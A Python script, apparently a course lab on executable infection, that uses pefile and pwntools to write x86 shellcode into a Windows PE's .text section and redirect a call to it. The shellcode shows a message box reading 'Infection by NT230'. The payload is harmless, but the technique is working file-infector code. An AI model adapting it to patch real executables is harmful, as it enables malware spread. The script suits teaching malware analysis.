import pefile
import mmap
import os
import shutil
from pwn import *

# Get MessageBoxW address
def get_MessageBoxW_address(pe):
    MessageBoxWAddress = None
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        if entry.dll == b"USER32.dll":
            for func in entry.imports:
                if func.name == b"MessageBoxW":
                    MessageBoxWAddress = func.address

    if MessageBoxWAddress:
        return MessageBoxWAddress
    else:
        return False

def get_addresses(pe):
    plog = log.progress("STEP 1: Getting addresses")
    
    msgBoxAddr = get_MessageBoxW_address(pe)

    entryPoint = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    imageBase = pe.OPTIONAL_HEADER.ImageBase

    # Inject into .text section
    textSection = pe.sections[0]
    textSectionRA = textSection.PointerToRawData
    textSectionVA = textSection.VirtualAddress

    offset = textSectionVA - textSectionRA

    shellcodeRA = textSectionRA + 0xcb0
    shellcodeVA = shellcodeRA + offset

    # Address of caption and text
    captionRA = shellcodeRA + 0x20
    textRA = captionRA + 0x30

    captionVA = captionRA + offset
    textVA = textRA + offset

    # Calculate absolute address
    absCaptionVA = imageBase + captionVA
    absTextVA = imageBase + textVA
    absShellcodeVA = imageBase + shellcodeVA
    absTextSectionVA = imageBase + textSectionVA

    log.success("Image base: 0x{:X}".format(imageBase))
    log.success("MessageBoxW: 0x{:X}".format(msgBoxAddr))
    log.success("Shellcode: 0x{:X}".format(absShellcodeVA))
    log.success("Text secion: 0x{:X}".format(absTextSectionVA))
    log.success("Caption: 0x{:X}".format(absCaptionVA))
    log.success("Text: 0x{:X}".format(absTextVA))

    returnValue = {
        "imgBase": imageBase,
        "shellcodeRA": shellcodeRA,
        "textSectionRA": textSectionRA,
        "absShellcodeVA": absShellcodeVA,
        "absTextSectionVA": absTextSectionVA,
        "caption": absCaptionVA,
        "text": absTextVA,
        "msgBox": msgBoxAddr,
    }

    return returnValue

# Constructing payload
def create_shellcode(pe, addrs):
    plog = log.progress("STEP 2: Constructing shellcode")

    caption = b"\x49\x00\x6e\x00\x66\x00\x65\x00\x63\x00\x74\x00\x69\x00\x6f\x00\x6e\x00\x20\x00\x62\x00\x79\x00\x20\x00\x4e\x00\x54\x00\x32\x00\x33\x00\x30"
    text = b"\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x30\x00\x34\x00\x5f\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x33\x00\x39\x00\x5f\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x31\x00\x37"

    payload = b"\x6a\x00"
    payload += b"\x68" + p32(addrs["caption"])
    payload += b"\x68" + p32(addrs["text"])
    payload += b"\x6a\x00"
    payload += b"\xff\x15" + p32(addrs["msgBox"])

    # Pop the stack to get original arguments
    payload += b"\x59\x59\x59\x59"

    # Call original MessageBoxW
    payload += b"\xff\x15" + p32(addrs["msgBox"])

    payload += b"\x00" * (0x20 - len(payload))
    payload += caption
    payload += b"\x00" * (0x30 - len(caption))
    payload += text

    plog.success("Completed")

    return payload

# Injecting shellcode
def inject_shellcode(pe, shellcode, addrs, output):
    plog = log.progress("STEP 3: Injecting shellcode")

    pe.set_bytes_at_offset(addrs["shellcodeRA"], shellcode)
    
    offset = addrs["absShellcodeVA"] - (addrs["absTextSectionVA"] + 0xe + 0x6)
    pe.set_bytes_at_offset(addrs["textSectionRA"] + 0xe, b"\x90\xe8" + p32(offset))

    pe.write(output)

    plog.success("Shellcode injected successfully")

def main():
    inputPath = "shellcode.exe"
    outputPath = inputPath.replace(".exe", "-output.exe")

    shutil.copy2(inputPath, outputPath)
    pe = pefile.PE(outputPath)

    addrs = get_addresses(pe)
    print()

    shellcode = create_shellcode(pe, addrs)
    print()
    
    inject_shellcode(pe, shellcode, addrs, outputPath)
    print()

    log.info("Written to: {}".format(outputPath))

if __name__ == "__main__":
    main()